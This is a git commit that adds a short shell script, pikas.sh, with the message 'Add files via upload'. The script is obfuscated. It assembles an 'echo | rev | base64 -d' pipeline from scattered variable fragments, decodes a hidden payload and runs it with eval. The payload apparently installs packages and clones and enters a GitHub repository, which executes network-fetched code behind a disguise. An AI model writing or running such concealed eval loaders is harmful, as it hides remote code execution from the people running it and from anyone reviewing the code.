b6139e487ef7cbf8aeb1dc8b774900636e6297f6
luisakrac <50025904+luisakrac@users.noreply.github.com>
2019-11-14 23:42:47 -0600

    Add files via upload

---
+++ pikas.sh
@@ -0,0 +1,4 @@
+gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '==gCKM3chtWawBiZy1CItJnCkNmCzd3bj9SZyFGaz9iczV3LzVGbpZ2L4VXbyVGdu02bj9SY0FGZvEGdhR2Lgc3bj5ydvVWbgYXb7M0QBJ1SgQ2Y7M3chtWawBCZjtDZjtDdpdmLDNUQSt0LjFmcrF2cpVHbv02bj5iY1hGdpd2LvozcwRHdoBSZu9GbjBCdpdmCKIXYlx2YKkXYzd3bjBCbsFGdz5Wagc2awpgchVGbjpAdhNGbvxGIsxWY0NnbpBSbldmCyFWZsNmCkNmCKg2chJ2LulmYvEyI
+' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
+x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
+eval "$N0q$x$Hc2$rQW"
